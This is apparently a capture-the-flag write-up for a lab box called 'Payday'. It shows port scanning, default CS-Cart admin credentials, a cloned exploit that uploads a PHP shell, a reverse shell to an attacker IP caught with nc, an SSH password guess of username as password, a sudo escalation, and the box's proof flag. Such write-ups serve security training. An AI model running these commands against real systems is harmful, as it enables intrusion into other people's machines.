---
title: "Payday - Writeup"
linkTitle: "Payday"
weight: 7
featured: true
platform: "PG"
name: "Payday"
os: "Linux"
difficulty: "Easy"
release: "03 Jul 2026"
ip: "192.168.109.39"
# Drop a real avatar at static/img/pg/payday.png and uncomment:
# avatar: "/img/pg/payday.png"
tags: ["linux", "cs-cart", "authenticated-rce", "lfi", "weak-credentials", "sudo"]
description: "Easy Linux box. Default CS-Cart admin creds lead to an authenticated RCE, an LFI-leaked /etc/passwd points at a weak-password user, and a wide-open sudoers entry finishes the job."
---

{{< htb name="Payday" os="Linux" difficulty="Easy" release="03 Jul 2026" ip="192.168.109.39" platform="PG" >}}

## Reconnaissance

```
(root㉿kali)# sudo nmap -sS -sV -sC -T4 -p- -v -oN scans/fullport.scan 192.168.109.39
```

```
PORT      STATE    SERVICE      VERSION
22/tcp    open     ssh          OpenSSH 4.6p1 Debian 5build1
80/tcp    open     http         Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-title: CS-Cart. Powerful PHP shopping cart software
110/tcp   open     pop3         Dovecot pop3d
139/tcp   open     netbios-ssn  Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp   open     imap         Dovecot imapd
445/tcp   open     netbios-ssn  Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp   open     ssl/imap     Dovecot imapd
995/tcp   open     ssl/pop3     Dovecot pop3d
```

Everything here is old, Apache 2.2.4, PHP 5.2.3, and the site itself identifies as **CS-Cart**.

## Enumeration

The install page confirms the exact version.

![CS-Cart install page showing version 1.3.3](/img/pg/payday/01-cscart-install.png)

**CS-Cart 1.3.3** has a long list of known issues.

```
(root㉿kali)# searchsploit CS-Cart
```

```
CS-Cart 1.3.3 - 'classes_dir' LFI                                | php/webapps/48890.txt
CS-Cart 1.3.3 - authenticated RCE                                | php/webapps/48891.txt
CS-Cart 1.3.5 - Authentication Bypass                             | php/webapps/6352.txt
```

Default admin credentials (`admin:admin`) log straight into the store's back office.

![CS-Cart admin dashboard after logging in with default credentials](/img/pg/payday/02-cscart-admin-dashboard.png)

Along with the RCE, the same version has a known LFI. Reading `/etc/passwd` through it surfaces a standard, non-system user account on the box, `patrick`.

## Initial Foothold

With admin access confirmed, the authenticated RCE is the direct path in.

```
(root㉿kali)# git clone https://github.com/strikoder/cscart-rce-lfi-exploit
(root㉿kali)# cd cscart-rce-lfi-exploit
(root㉿kali)# python3 cscart_exploit.py -t http://192.168.109.39 -u admin -p admin -c "id"
```

```
[*] Logging in to http://192.168.109.39/admin.php
[+] Authentication successful
[*] Uploading shell.phtml
[+] Shell verified
[*] Executing: id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Send it a reverse shell instead of a one-off command.

```
(root㉿kali)# python3 cscart_exploit.py -t http://192.168.109.39 -u admin -p admin -i 192.168.45.187 22
(root㉿kali)# nc -lnvp 22
```

```
connect to [192.168.45.187] from (UNKNOWN) [192.168.109.39] 39868
whoami
www-data
```

## Privilege Escalation

`www-data` is heavily restricted. The `patrick` account found via the LFI is the next target. Given the outdated software and default admin creds already found on this box, weak account passwords fit the same pattern, so the username itself is worth trying as the password.

```
(root㉿kali)# ssh patrick@192.168.109.39
```

```
Credentials: patrick:patrick
```

Login succeeds. Check sudo rights immediately.

```
patrick@payday:~$ sudo -l
```

```
[sudo] password for patrick: patrick

User patrick may run the following commands on this host:
    (ALL) ALL
```

Full, unrestricted sudo. Escalate directly.

```
patrick@payday:~$ sudo su
root@payday:/# cd /root
root@payday:~# cat proof.txt
```

```
5fc37d483691321fc4c9e57c296b9195
```

## Lessons learned

- An LFI is worth exploiting for recon value even when a separate RCE already exists. `/etc/passwd` handed over the exact username needed for the credential-reuse guess that actually finished the box.
- A box's overall security posture is a signal you can act on. Default admin creds and ancient software versions both point at the same operator habits, so testing "username as password" against every discovered account is a reasonable next move, not a wild guess.
- Run `sudo -l` the instant a new user shell lands, before trying anything else. It's the fastest possible privesc check, and here it ended the box in one command.
